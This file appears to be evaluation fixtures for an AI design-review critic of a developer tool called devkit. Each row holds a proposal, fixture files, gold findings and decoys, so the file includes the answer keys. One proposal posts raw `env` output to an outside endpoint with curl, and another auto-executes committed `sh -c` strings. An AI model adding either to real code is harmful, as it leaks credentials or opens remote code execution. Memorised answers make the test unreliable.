base.cli/commands/release.mjs: // current release flow: builds, bumps, opens a release PR

gold.desc: The recorded main-branch-protection Target says the ruleset blocks direct pushes (admins included) — the proposed push-to-main flow contradicts a recorded decision and will be rejected by the remote
Tagging the local release commit is wrong once changes land via PR squash — the tag must target the squashed merge commit on main

decoys.desc: A one-command release entry point (devkit release) is fine — the objection is the direct-push transport, not the command

note: Outcome-verified: the direct push was rejected by the ruleset in real history; releases are now cut via release branch + PR, tag on the squashed commit (memory devkit-release-needs-pr-not-direct-push). Tests the decision-log lens with a scoped Target in the fixture.

prompt:
## Proposal
Default DEVKIT_REPO to `git+ssh://git@github.com/norvalbv/devkit.git` for `devkit install` / `devkit update` so authenticated pulls work out of the box.

## Problem Statement
Install/update need a default remote; SSH avoids token prompts for the maintainer.

## Proposed Solution
update.mjs: `const REPO = process.env.DEVKIT_REPO ?? "git+ssh://git@github.com/norvalbv/devkit.git"` and pass it to `bun add -g`.

## Tech Stack & Constraints
Consumers install via bun on machines devkit does not control. The repo is public.

base.README.md:
# devkit
Public repo. Install: bun add -g github:norvalbv/devkit

gold.desc: git+ssh default fails on consumer machines without GitHub SSH keys (and bun cannot clone git+ssh in common setups) — for a PUBLIC repo the default must be git+https; ssh can stay an env override
The failure mode is a cryptic bun/git clone error at install time with no hint that DEVKIT_REPO is the knob

decoys.desc: Honouring a DEVKIT_REPO env override is right and should stay

note: Outcome-verified: sc-1057 / PR #23 changed the default to git+https for exactly this reason (bun could not clone git+ssh here; repo public — memory devkit-update-git-ssh-vs-https).

prompt:
## Proposal
Tighten the agent-hook stop-loop guard: `grep -E 'stop[[:digit:]]+\s+loop'` over the hook transcript to detect repeated stop events.

## Problem Statement
The current guard misses whitespace-separated repeats.

## Proposed Solution
Add the `\s`-based pattern above to hooks/agent-hook.sh. Verified working on the dev Mac (grep accepts \s there).

## Tech Stack & Constraints
Hooks run on consumer machines: macOS (BSD grep, various versions) and Linux (GNU grep).

gold.desc: \s is a GNU extension not guaranteed on older BSD grep — on consumer Macs the guard silently never matches; use POSIX [[:space:]] instead

decoys.desc: Detecting repeated stop events in the transcript (the guard itself) is sound

note: Outcome-verified: sc-1042 / PR #20 landed POSIX [[:space:]] in the hook greps for portability, despite \s working on the dev machine — "verified on my Mac" is the trap.

prompt:
## Proposal
The critique agent always writes its artifacts to `.cursor/.feature-critique.md` and `.cursor/.edge-cases.json`, on every surface.

## Problem Statement
Downstream agents need a fixed, known path to read the full report from.

## Proposed Solution
Hardcode the two .cursor/ paths in the agent brief; parent agents read them verbatim.

## Tech Stack & Constraints
The agent brief is synced to BOTH .claude/ (Claude Code) and .cursor/ (Cursor) surfaces; many consumer repos are Claude-only and have no .cursor directory at all.

base.agents/feature-critique.md:
---
name: feature-critique
---
Writes report to .cursor/.feature-critique.md (fixed path).
base..claude/agents/feature-critique.md:
---
name: feature-critique
---
Writes report to .cursor/.feature-critique.md (fixed path).

gold.desc: Runtime critique must not write any report or edge-case artifact inside the repository or a provider directory; the response should be exact structured JSON and capture belongs in devkit's private evidence spool
A shared overwritten path loses prior critiques and collides under concurrent work

decoys.desc: Returning one structured response gives the parent the critique without repository artifacts

note: Mined from the shipped hardcoded .cursor artifact behavior. The corrected target is provider-neutral runtime output with local immutable hook capture; no provider directory is an allowed runtime evidence store.

prompt:
## Proposal
Simplify the eval regression gate: `--fail` exits 1 whenever a headline metric drops more than 2 percentage points vs the baseline.

## Problem Statement
The flip-table/McNemar machinery is hard to explain; a plain delta threshold is legible to everyone.

## Proposed Solution
Replace the flip-table comparison in compare() with `if (baseline.metric - current.metric > 0.02) fail`.

## Known Risks
None — 2pp is generous.

base.docs/decisions/INDEX.md:
# Decision index
- bench-gates-on-flips-not-deltas — eval --fail gates on the per-row flip table (mid-p McNemar) + hard floors; NEVER on aggregate metric deltas
base.docs/decisions/bench-gates-on-flips-not-:
## Target · 2026-06-18 — bench gates on flips, not deltas

**Context:** two runs with identical accuracy can disagree on a third of their rows; aggregate deltas hide it. Wilson 95% on these corpus sizes is a large-effect tripwire.
**Ruling:** `--fail` gates ONLY on hard floors + the per-row flip table under a mid-p McNemar test. Aggregate metric deltas print informationally and NEVER gate.
**Rejected:** percentage-point delta thresholds (2pp/5pp) — statistically meaningless at n≈40 and Goodhartable.
**Scope:** gate-engine/**/eval/**
base.gate-engine/decisions/eval/bench.mjs:
// compare(): comparability skip → hard floors → per-row flip table (mid-p McNemar).
// Aggregate deltas print informationally only — see docs/decisions/bench-gates-on-flips-not-deltas.md

gold.desc: Directly reverses the recorded bench-gates-on-flips-not-deltas Target (aggregate deltas hide compensating per-row flips; 2pp is noise at this n) with no new evidence — a flip-flop on a settled, scoped decision

decoys.desc: Wilson intervals on headline metrics are recorded practice and not up for re-litigation in this change

note: The fixture records the real devkit decision (decisions-eval README / bench-gates-on-flips). Proposal reverses it citing only legibility — the critic must query the log and name the flip-flop. Decoy checks it does not ALSO re-litigate Wilson.

## Proposal
Make eval regression checks legible: fail a run when any headline number is more than two points below the stored baseline, and delete the paired flip-table / McNemar comparison.

## Problem Statement
Reviewers do not understand mid-p McNemar output; a two-point rule fits in one sentence.

## Proposed Solution
compare() keeps the comparability skips, then: `regressed = (base - cur) > 0.02` per headline. Remove the flip-table code path.

base.docs/decisions/INDEX.md:
# Decision index

**Scope:** gate-engine/**/eval/**

// compare(): comparability skip → hard floors → per-row flip table (mid-p McNemar).

gold.desc: Directly reverses the recorded bench-gates-on-flips-not-deltas Target (aggregate deltas hide compensating per-row flips; 2pp is noise at this n) with no new evidence — a flip-flop on a settled, scoped decision

decoys.desc: Wilson intervals on headline metrics are recorded practice and not up for re-litigation in this change

## Proposal
Add a `--json` flag to `guard-decisions query` that prints the matching Targets as a JSON array (slug, ruling, scope) instead of prose, for scripting.

## Problem Statement
Agents and scripts re-parse the human-readable query output with regexes.

## Proposed Solution
cli.mjs: when --json, collect the match objects already built for printing and JSON.stringify them to stdout. No behaviour change without the flag.

base.gate-engine/decisions/cli.mjs: // guard-decisions query <topic> — prints matching Targets as prose today
base.docs/decisions/INDEX.md:
# Decision index
- example-target — an example ruling

gold.desc: No output-contract consideration: consumers will pin to the JSON shape, so the fields/versioning (and empty-log / no-match shape) need stating up front

decoys.desc: A --json flag reusing the already-built match objects is the right, minimal mechanism

note: The workflow contract row now scores the exact JSON response plus deterministic assertions that the fixture is unchanged, provider artifacts are absent, and no flow identifier exists.

prompt:
## Proposal
When a hook crashes, auto-upload a diagnostic bundle (hook stderr, the failing command, and `env` output) to our telemetry endpoint so failures are debuggable without asking users.

## Problem Statement
Hook crash reports from consumers are unreproducible; we never get the environment.

## Proposed Solution
hooks/lib/report-crash.sh: on non-zero exit, `curl -s -X POST https://telemetry.devkit.dev/crash -d "$(env; cat stderr.log)"` — fire-and-forget.

gold.desc: Uploading raw `env` exfiltrates secrets (tokens, AWS keys, GITHUB_TOKEN live in consumer env) to a third-party endpoint — an unacceptable data-exposure surface in a commit hook
Silent fire-and-forget telemetry from consumer machines with no opt-in, disclosure, or redaction path

decoys.desc: Wanting reproducible crash context from consumer machines is a legitimate need (an opt-in, redacted report could serve it)

note: Security-class anchor row: env output in consumer shells contains credentials by default; a hook that posts it is exfiltration regardless of intent. Clear by design (calibration).

prompt:
## Proposal
Let repos extend the gate pipeline declaratively: guard.config.json gains `"hooks": {"preCommitCmd": "<shell>"}` which the engine runs via `sh -c` before the built-in gates.

## Problem Statement
Repos want custom checks without forking devkit hooks.

## Proposed Solution
config.mjs reads hooks.preCommitCmd; run-gates.mjs executes it first, aborting the commit on non-zero exit.

## Tech Stack & Constraints
guard.config.json is committed repo content; devkit gates run automatically on clone + commit for anyone who has devkit installed.

base.gate-engine/config.mjs: // resolveGuardConfig(cwd): reads committed guard.config.json from the repo
base.gate-engine/run-gates.mjs: // runs the built-in gate pipeline on commit

gold.desc: Executing a committed-config shell string on commit means ANY cloned repo (or merged PR editing guard.config.json) runs arbitrary commands on every contributor machine with devkit installed — supply-chain RCE through repo content
A single sh -c string is shell/platform-dependent across consumer machines (BSD vs GNU tools, Windows), with no capability or timeout bounds

decoys.desc: Letting repos add custom checks without forking hooks is a fair goal (an allowlisted, prompt-gated mechanism could serve it)

note: Security-class borderline row: dressed as developer convenience; the flaw is the trust boundary (committed content → auto-exec on other machines). Holdout.

prompt:
## Proposal
Add `scripts/finding-matcher.mjs`: an LLM helper that maps free-text reviewer findings onto labelled gold/decoy slots (forced-choice per slot, majority vote), for the new reviewer eval.

## Problem Statement
The new eval cannot confusion-matrix open-ended findings; it needs a matcher.

## Proposed Solution
Fresh module in scripts/: buildPrompt per slot, claude -p forced choice, K=3 vote, kappa audit helper.

gold.desc: gate-engine/review/eval/matcher.mjs already implements exactly this (forced-choice slots, K-vote, kappa) — a second fresh matcher in scripts/ duplicates it and the two will drift; extend/share the existing module instead

decoys.desc: The eval genuinely needs slot matching — forced-choice + majority vote is the right technique

note: Sibling-grep row: the fixture contains the existing matcher with a header saying what it does; the critic must find it and object to the duplicate, not to the technique (decoy).

prompt:
## Proposal
INDEX.md sometimes lists a slug twice after concurrent appends. Fix: on rebuild, dedupe entries by slug keeping the FIRST occurrence.

## Problem Statement
Duplicate index lines confuse the query command.

## Proposed Solution
decisions.mjs rebuildIndex(): `seen.has(slug) ? skip : keep` scanning top-to-bottom.

base.docs/decisions/INDEX.md:
# Decision index
- storage-engine — ruling v1 (2026-05-01)
- storage-engine — ruling v2 supersedes v1 (2026-06-20)

gold.desc: The writer appends re-targets newest-LAST (currentTarget = last block), so keep-FIRST dedupe surfaces the SUPERSEDED ruling as current — readers and writer disagree on order; it must keep the last occurrence

decoys.desc: Deduping the index is fine — only the keep-first direction is wrong

note: Reader/writer alignment row: the fixture states the append-newest-last contract and shows a superseding v2 line; keep-first visibly resurrects v1. The critic must trace the ordering assumption.

prompt:
## Proposal
Quality push: the Target rationale-depth judge (currently informational) becomes a HARD commit block — any staged Target scoring THIN rejects the commit.

## Problem Statement
THIN decision records keep landing; warnings are ignored.

## Proposed Solution
check-alignment.mjs: depth THIN → exit 1 (block) instead of warn. No override flag — overrides would be abused.

gold.desc: Hard-blocking on a noisy LLM judgement (measured false-THIN rate, NULL ambiguity) turns every judge miss into a blocked commit — an advisory tier exists precisely because this failure mode is DX-catastrophic
No override path at all means a judge outage or misfire leaves no way to land urgent work

decoys.desc: THIN records landing unreviewed is a real problem worth addressing (ratchets/review queues could serve it)

note: UX-class anchor: technically trivial change whose cost is entirely experiential (false-positive commit blocks, no escape hatch). The fixture states the warn-only rationale in the code header.

## Proposal
Every headline metric line in the decisions bench prints raw counts plus a Wilson 95% interval instead of a bare percentage.

## Problem Statement
Bare percentages at n≈40 invite over-reading; intervals keep readers honest.

## Proposed Solution
Add a closed-form wilson(k, n) helper and thread it through the three headline prints. No gating change — the flip-table --fail machinery is untouched.

base.docs/decisions/INDEX.md:
# Decision index
- bench-gates-on-flips-not-deltas — --fail gates on flip table + floors, never aggregate deltas
base.gate-engine/decisions/eval/bench.mjs: // headline prints are bare percentages today; --fail = flip table + floors

decoys.desc: Closed-form Wilson (over bootstrap/Wald) at small n is the established right choice
The flip-table --fail gate is a recorded decision and this change leaves it untouched

note: Decoy-only row (empty gold): a small statistics-flavoured change that is simply correct. Any CRITICAL here is fabricated by construction; the scary-adjacent decoys probe re-litigation.

## Proposal
Fix the composer crash: `parseRelativeDate(input)` throws `Cannot read properties of null` when callers pass null for an absent optional date.

## Proposed Solution
Add `if (input == null) return null;` at the top of parseRelativeDate in src/shared/lib/dates.ts, plus unit tests for null, undefined, a valid ISO date, and a malformed string.

decoys.desc: The early-return null guard at the top of the function is the right minimal fix

base.docs/decisions/INDEX.md:
# Decision index

base.docs/decisions/posix-hook-greps.md:
## Target · 2026-07-02 — POSIX classes in hook greps

**Ruling:** shipped hook grep patterns use POSIX character classes, never GNU-only escapes; consumer machines span BSD and GNU grep.

base.docs/decisions/INDEX.md:
# Decision index
- posix-hook-greps — hook grep patterns use POSIX classes ([[:space:]]) for BSD/GNU portability
base.docs/decisions/posix-hook-greps.md:
## Target · 2026-07-02 — POSIX classes in hook greps

**Ruling:** shipped hook grep patterns use POSIX character classes, never GNU-only escapes; consumer machines span BSD and GNU grep.

## Proposal
sync-skills writes `.devkit/skills-manifest.json` — sha256 per synced file — so `devkit doctor` can flag source-vs-copy drift without diffing every file.

## Proposed Solution
Hash each file as it is copied; doctor compares stored vs recomputed hashes and prints drifted paths.

base.cli/sync-skills.mjs: // copies skills/** into .claude/ and .cursor/ per surface
base.cli/doctor.mjs: // health checks; no drift detection today

decoys.desc: Copy + checksum manifest is the established drift-detection mechanism here (it is what shipped and works)

note: Outcome-verified sound design (the shipped sync-skills/doctor mechanism). Decoy-only holdout row for the false-alarm instrument.

prompt:
## Proposal
Aggressively rewrite the global gate bootstrap to bypass the legacy resolution path and mutate the shared hook state exactly once per process.

## Problem Statement
The bootstrap currently re-resolves guard.config.json on every gate invocation in the same commit (4-6 redundant reads).

## Proposed Solution
Module-level memoization: first resolveGuardConfig(cwd) call caches by realpath(cwd); subsequent gates in the same process reuse it. Cache is per-process (gates are short-lived commit processes), no invalidation needed within one commit, and tests reset it via an exported clearConfigCache().

## Known Risks
None material: the cache lives and dies with one commit's gate process.

base.gate-engine/config.mjs: // resolveGuardConfig(cwd): stats + parses guard.config.json on every call today

decoys.desc: Per-process memoization keyed by realpath(cwd), with a test-only reset, is a correct and proportionate fix for redundant reads in a short-lived process

note: Keyword-decoy adversarial row: "aggressively rewrite", "bypass", "mutate shared state" dress a boring, correct memoization. A critic pattern-matching on scary words fabricates a blocker here.
